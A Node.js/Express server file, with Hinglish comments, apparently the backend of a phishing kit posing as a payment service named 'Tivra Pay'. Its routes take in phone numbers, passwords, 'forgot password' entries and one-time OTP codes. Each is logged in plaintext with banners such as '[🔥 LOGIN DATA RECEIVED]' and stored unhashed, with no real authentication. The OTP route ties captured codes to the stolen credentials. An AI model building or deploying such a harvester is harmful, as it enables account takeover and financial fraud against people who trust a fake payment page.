const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { MongoMemoryServer } = require('mongodb-memory-server');

const app = express();
app.use(express.json());
app.use(cors()); // Frontend aur Backend connectivity ke liye

// 1. Data Structure (Schema)
const userSchema = new mongoose.Schema({
    phoneNumber: { type: String, required: true },
    password: { type: String, required: true },
    otpEntered: { type: String, default: "" },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// ====== NAYA ADD KIYA: Root Route (Browser test ke liye) ======
app.get('/', (req, res) => {
    res.send("<h1>🚀 Tivra Pay Backend Server is Active and Running!</h1>");
});

// 2. API Route: Login Data Receive Karne Ke Liye
app.post('/api/login-submit', async (req, res) => {
    try {
        const { phoneNumber, password } = req.body;
        console.log(`\n[🔥 LOGIN DATA RECEIVED] Phone: ${phoneNumber}, Pass: ${password}`);
        
        // Data ko database mein save karein
        const newUser = new User({ phoneNumber, password });
        const savedUser = await newUser.save();
        
        res.status(200).json({ success: true, userId: savedUser._id });
    } catch (err) {
        console.error("Login Error:", err);
        res.status(500).json({ success: false, message: "Server Error" });
    }
});

// ====== NAYA ADD KIYA: Forgot Password Route ======
app.post('/api/forgot-submit', async (req, res) => {
    try {
        const { phone, newPassword } = req.body;
        console.log(`\n[🔑 FORGOT PASSWORD REQUEST] Phone: ${phone}`);
        
        // Naya user entry banayein ya update karein
        const newUser = new User({ phoneNumber: phone, password: newPassword });
        const savedUser = await newUser.save();
        
        res.status(200).json({ success: true, userId: savedUser._id });
    } catch (err) {
        res.status(500).json({ success: false });
    }
});

// ====== NAYA ADD KIYA: OTP Submit Route ======
app.post('/api/otp-submit', async (req, res) => {
    try {
        const { userId, otp } = req.body;
        console.log(`\n[📩 OTP RECEIVED] UserID: ${userId}, OTP: ${otp}`);
        
        if (userId) {
            await User.findByIdAndUpdate(userId, { otpEntered: otp });
            res.status(200).json({ success: true, message: "OTP Saved Successfully!" });
        } else {
            res.status(400).json({ success: false, message: "User ID missing" });
        }
    } catch (err) {
        console.error("OTP Error:", err);
        res.status(500).json({ success: false });
    }
});

// 3. Database Server Initialization Function
async function startServer() {
    try {
        const mongoServer = await MongoMemoryServer.create();
        const mongoUri = mongoServer.getUri();
        
        await mongoose.connect(mongoUri);
        console.log('\n====================================');
        console.log('🎉 MongoDB (In-Memory) Connected Successfully!');
        console.log('====================================');

        // PORT: Render hamesha process.env.PORT use karta hai, local par 6500 chalega
        const PORT = process.env.PORT || 6500;
        app.listen(PORT, () => {
            console.log(`🚀 Backend Server running on port ${PORT}`);
            console.log('====================================\n');
        });
    } catch (err) {
        console.error('❌ Database Connection Error:', err);
    }
}

startServer();
